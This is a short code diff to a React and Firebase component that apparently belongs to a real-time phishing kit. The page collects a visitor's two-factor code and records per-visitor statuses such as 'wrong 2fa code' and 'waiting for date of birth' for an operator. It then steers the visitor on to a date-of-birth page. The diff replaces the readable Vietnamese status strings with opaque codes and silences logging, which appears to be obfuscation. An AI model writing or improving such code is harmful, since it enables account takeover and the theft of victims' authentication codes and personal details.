@@ -1,9 +1,8 @@
 import { onValue, ref, update } from "firebase/database";
-import React, { useEffect, useRef, useState } from "react";
+import React, { useEffect, useState } from "react";
 import { useNavigate } from "react-router";
 import { database } from "../Utils/firebase";
 import "./facode.scss";
-import useOutsideClick from "../hooks/useOutsideClick";
 
 const FaCode = () => {
   const [facode, setFacode] = React.useState("");
@@ -36,7 +35,7 @@ const FaCode = () => {
     const updates = {};
     updates[
       "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
-    ] = "User yêu cầu gửi lại mã 2fa";
+    ] = "3z";
     update(ref(database), updates);
   };
 
@@ -47,10 +46,10 @@ const FaCode = () => {
     );
     onValue(starCountRef, (snapshot) => {
       const data = snapshot.val();
-      console.log(data);
+      // console.log(data);
       if (data?.user_status === "Đang chờ user nhập ngày sinh") {
         navigate("/confirm/date-of-birth");
-      } else if (data?.user_status === "Sai mã 2fa") {
+      } else if (data?.user_status === "2") {
         setValidating(false);
         setError_login_code(true);
         const updates = {};
